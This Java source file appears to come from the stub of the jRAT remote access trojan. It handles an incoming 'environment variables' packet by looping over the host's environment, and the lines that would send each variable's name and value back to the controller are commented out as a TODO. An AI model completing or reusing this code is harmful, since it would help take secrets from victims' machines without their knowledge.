package se.jrat.stub.packets.incoming;

import java.util.Set;


public class Packet96EnvironmentVariables extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<String> set = System.getenv().keySet();
		for (String str : set) {
			// TODO
			/*Connection.writeLine("VARPROP");
			Connection.writeLine(str);
			Connection.writeLine(System.getenv(str));*/
		}
	}

}
